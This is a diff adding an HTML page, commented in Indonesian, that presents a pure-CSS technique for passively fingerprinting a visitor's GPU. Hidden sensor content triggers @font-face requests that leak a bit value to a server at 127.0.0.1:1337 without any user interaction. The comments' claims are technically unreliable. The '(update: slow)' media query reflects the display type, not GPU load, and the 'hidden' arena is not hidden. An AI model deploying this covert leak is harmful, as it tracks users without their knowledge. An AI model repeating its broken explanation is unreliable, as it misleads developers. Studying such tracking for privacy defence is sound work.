@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pure CSS GPU Fingerprint Extraction</title>
+  <style>
+    /* =================================================================== */
+    /* BAGIAN 1: MESIN FINGERPRINT (KODE ANDA, TIDAK BERUBAH)              */
+    /* Ini adalah inti yang menciptakan perbedaan visual antar peramban.     */
+    /* =================================================================== */
+    #gpu-fingerprint-arena {
+      /* Kita sembunyikan karena ekstraksi terjadi secara pasif */
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      border: 1px solid #333;
+    }
+    .layer {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+    }
+    .layer1 { 
+      background: conic-gradient(from 3.14159rad at 10% 30%, red, orange, yellow, green, blue);
+    }
+    .layer2 { 
+      background: radial-gradient(circle at 75% 75%, rgba(0,0,255,0.5), rgba(0,255,0,0) 50%);
+      mix-blend-mode: hard-light;
+    }
+
+    /* =================================================================== */
+    /* BAGIAN 2: MEKANISME KEBOCORAN (PENGGANTI JAVASCRIPT)                */
+    /* Kita definisikan font "mata-mata" untuk setiap bit informasi.      */
+    /* =================================================================== */
+
+    /* -- Font untuk Bit 1 (Hasil dari Beban GPU Total) -- */
+    @font-face {
+      font-family: 'LeakyFont_Bit1';
+      /* Hanya muat font ini jika karakter 'A' dibutuhkan */
+      unicode-range: U+41; 
+      /* Jika 'A' muncul, bocorkan '1A' ke server */
+      src: url('http://127.0.0.1:1337/leak.png?bit1=fast_update');
+    }
+    @font-face {
+      font-family: 'LeakyFont_Bit1';
+      /* Hanya muat font ini jika karakter 'B' dibutuhkan */
+      unicode-range: U+42;
+      /* Jika 'B' muncul, bocorkan '1B' ke server */
+      src: url('http://127.0.0.1:1337/leak.png?bit1=slow_update');
+    }
+
+    /* =================================================================== */
+    /* BAGIAN 3: SENSOR (PENGHUBUNG MESIN & MEKANISME KEBOCORAN)          */
+    /* Sensor ini akan menampilkan karakter 'A' atau 'B' berdasarkan      */
+    /* performa render, yang dipengaruhi oleh #gpu-fingerprint-arena.     */
+    /* =================================================================== */
+
+    #css-sensor {
+      /* Terapkan font mata-mata kita */
+      font-family: 'LeakyFont_Bit1';
+      /* Elemen ini tidak perlu terlihat */
+      position: absolute;
+      top: -9999px;
+    }
+
+    /* Secara default, asumsikan perangkat cepat. Coba bocorkan 'A'. */
+    #css-sensor::after {
+      content: 'A';
+    }
+
+    /* 
+     * KONDISI UTAMA:
+     * Jika @media mendeteksi bahwa refresh rate perangkat melambat 
+     * (kemungkinan karena beban GPU dari #gpu-fingerprint-arena),
+     * ganti konten menjadi 'B'. Ini akan memicu permintaan font yang berbeda.
+    */
+    @media (update: slow) {
+      #css-sensor::after {
+        content: 'B';
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Ekstraksi Sidik Jari GPU dengan CSS Murni</h1>
+  <p>
+    Halaman ini secara pasif mencoba mengekstrak 1-bit informasi dari rendering GPU Anda.
+    Tidak ada tombol atau interaksi yang diperlukan. Hasilnya akan muncul sebagai permintaan di log server Anda.
+  </p>
+  <p>
+    Mekanisme ini menggantikan kebutuhan akan `html2canvas` dan JavaScript `getImageData`.
+  </p>
+
+  <!-- Mesin fingerprint Anda, bekerja di latar belakang -->
+  <div id="gpu-fingerprint-arena">
+    <div class="layer layer1"></div>
+    <div class="layer layer2"></div>
+  </div>
+
+  <!-- Sensor yang akan memicu kebocoran data -->
+  <div id="css-sensor"></div>
+
+</body>
+</html>
